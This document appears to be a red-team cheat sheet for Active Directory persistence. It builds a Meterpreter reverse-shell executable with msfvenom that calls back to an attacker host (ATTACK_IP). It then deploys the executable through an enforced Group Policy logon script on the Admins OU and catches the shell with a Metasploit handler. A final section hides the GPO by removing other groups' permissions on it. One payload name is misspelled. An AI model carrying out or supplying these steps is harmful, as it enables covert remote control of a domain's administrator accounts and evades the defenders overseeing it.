# PREPARATION

#### 1) msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ATTACK_IP lport=PORT -f exe > shell.exe

#### 2) Create batch script (script.bat)

#### copy \\DOMAIN\sysvol\DOMAIN\scripts\shell.exe c:/tmp/shell.exe && timeout /t 20 && c:/tmp/shell.exe

#### 3) Copy both scripts with SCP to sysvol directory

#### 4) msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreyter/reverse_tcp; set LHOST ATTACK_IP; set LPORT PORT; exploit"

# GPO CREATION

#### 1) In our runas-spawned terminal, type mmc

#### 2) File-> Add/Remove Snap-in

#### 3) Group Policy Management snap-in, then Add

#### 4) OK

#### 5) Write a GPO that can apply to anyone you wish

# WRITING GPOs

#### 1) Right-click on the Admins OU and select Create a GPO in this domain and link it here. Give any name.

#### 2) Right-click on your policy and select enforced (Ensure that the policy will apply REGARDLESS)

#### 3) Under User Configuration, expand Policies -> Windows Settings 

#### 4) Scripts (Logon/Logoff)

#### 5) Right-click in Logon -> Properties

#### 6) Scripts tab

#### 7) Add -> Browse

#### 8) Navigate to Batch file as the script and click open and ok

#### 9) Apply and OK

#### 10) Run (multi/handler)

# HIDE IN PLAIN SIGHT

#### 1) mmc, policy, delegation

#### 2) right-click on ENTERPRISE DCs and select edit settings, delete, modify security

#### 3) Click ALLL other groups (except Authenticated Users) and click remove

#### 4) click on Advanced and remove the Created Owner from permissions

#### 5) Click Add

#### 6) Type Domain Computers, click Check Names and then OK

#### 7) Select Read Permissions and click OK

#### 8) Click on Authenticated users and click remove
